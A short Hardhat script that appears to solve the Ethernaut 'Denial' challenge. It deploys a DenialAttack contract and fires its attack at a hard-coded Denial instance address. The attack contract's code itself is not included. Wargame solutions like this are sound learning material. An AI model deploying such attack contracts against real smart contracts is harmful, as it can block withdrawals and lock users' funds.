import { ethers } from "hardhat";
import { Denial__factory } from "../typechain/factories/contracts/Denial__factory";
import { DenialAttack__factory } from "../typechain/factories/contracts/DenialAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x5E61f214EEe5e4C8327f97F52c523A7c97b6B357";
    let denial = new Denial__factory(signer).attach(instance_address);
    

    let attack = await new DenialAttack__factory(signer).deploy();
    await attack.deployed();
    let tx = await attack.attack(instance_address);
    await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
